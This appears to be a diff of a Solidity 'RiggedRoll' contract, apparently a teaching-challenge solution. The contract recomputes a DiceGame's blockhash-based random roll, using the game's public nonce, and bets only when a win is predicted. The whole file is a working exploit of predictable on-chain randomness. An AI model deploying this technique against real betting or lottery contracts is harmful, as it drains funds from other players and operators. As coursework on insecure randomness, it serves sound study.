@@ -7,11 +7,9 @@ import "@openzeppelin/contracts/access/Ownable.sol";
 
 contract RiggedRoll is Ownable {
     DiceGame public diceGame;
-    uint256 private trackedNonce;
 
     constructor(address payable diceGameAddress) {
         diceGame = DiceGame(diceGameAddress);
-        trackedNonce = 0; 
     }
 
     function withdraw(address payable to, uint256 amount) external onlyOwner {
@@ -24,18 +22,20 @@ contract RiggedRoll is Ownable {
         require(address(this).balance >= 0.002 ether, "Insufficient contract balance");
 
         bytes32 prevHash = blockhash(block.number - 1);
-        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), trackedNonce));
+        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
         uint256 rollResult = uint256(hash) % 16;
 
         console.log("Predicted roll result:", rollResult);
 
-        require(rollResult <= 5, "Predicted roll is not a winning number");
+        if (rollResult > 5) {
+            revert("Predicted roll is not a winning number");
+        }
 
         diceGame.rollTheDice{value: 0.002 ether}();
         console.log("Rigged roll executed successfully");
-
-        trackedNonce++;
     }
+
+
 
     receive() external payable {
         console.log("Received Ether:", msg.value, "Wei");
